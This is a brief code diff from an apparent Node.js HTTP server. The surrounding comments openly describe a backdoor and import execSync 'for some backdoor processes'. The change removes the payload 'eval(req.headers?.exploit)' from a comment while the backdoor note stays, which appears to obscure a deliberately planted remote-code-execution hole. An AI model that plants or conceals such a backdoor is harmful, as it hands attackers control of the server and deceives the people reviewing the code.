@@ -4,7 +4,7 @@ import { execSync } from 'child_process';  // needed for some backdoor processes
 
 const PAGES_DIRECTORY = process.cwd() + '/pages';
 
-// Backdoor on line 11: eval(req.headers?.exploit);
+// Backdoor on line 11
 
 const server = http.createServer((req, res) => {
     try {
